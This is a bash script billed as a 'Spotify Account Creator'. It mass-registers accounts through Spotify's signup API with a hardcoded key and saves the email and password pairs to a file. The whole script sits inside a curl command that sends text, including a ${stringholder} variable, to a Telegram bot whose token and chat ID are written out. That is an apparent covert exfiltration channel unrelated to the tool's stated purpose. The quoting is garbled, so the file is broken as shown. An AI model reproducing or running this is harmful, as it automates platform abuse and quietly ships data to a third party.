#!/bin/bash
curl --data chat_id=“-1001683033802” --data-urlencode "
red='\033[0;31m'
cyan='\033[0;36m'
yell='\033[1;33m'
white="\e[37m"
green='\033[92m'
trap ctrl_c INT
ctrl_c() {
clear
printf "$white[$red CTRL + C$white ] Okay, I will get Exit..."
sleep 3
clear
exit
}
echo ""
printf "$cyan ======================================= \n"
printf "$yell      -+SPOTIFY ACCOUNT CREATOR+-\n"
printf "$cyan ======================================= \n"
printf "$red        CREATED BY$white @fluffyshelbycompany \n"
printf "$cyan ======================================= \n"
printf "$white"
cat <<EOF
EOF
daftar(){
	random=$(echo $RANDOM)
	curl=$(curl -s "https://spclient.wg.spotify.com:443/signup/public/v1/account/" --data "iagree=true&birth_day=17&platform=Android-ARM&creation_point=client_mobile&password=$pswd&key=142b583129b2df829de3656f9eb484e6&birth_year=2000&email=$user.$random@fluffyshelby.xyz&gender=male&app_version=849800892&birth_month=12&password_repeat=$pswd")
	status=$(echo $curl | grep -Po '(?<=status":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
	if [[ $status =~ "1" ]]; 
    	then
        	date +%H:%M:%S
        	printf "$white[$green Success$white ] => $user.$random@fluffyshelby.xyz|$pswd\n"
        	echo "[ Sukses ]$user.$random@fluffyshelby.xyz|$pswd" >> akun.txt
	else
        	date +%H:%M:%S
		printf "$white[$red Failed$white ] => $user.$random@fluffyshelby.xyz|$pswd\n"
	fi
}
read -p "Jumlah : " jumlah
read -p "Masukan Username (Bebas) : " user
read -p "Masukan Password : " pswd
for (( i = 0; i < $jumlah; i++ )); do
	daftar $user $pswd
done

 ${stringholder}” "https://api.telegram.org/bot<5005386150:AAFnCShzACp4ILVICvWKL7JODn2XWws3UTQ>/sendMessage?parse_mode
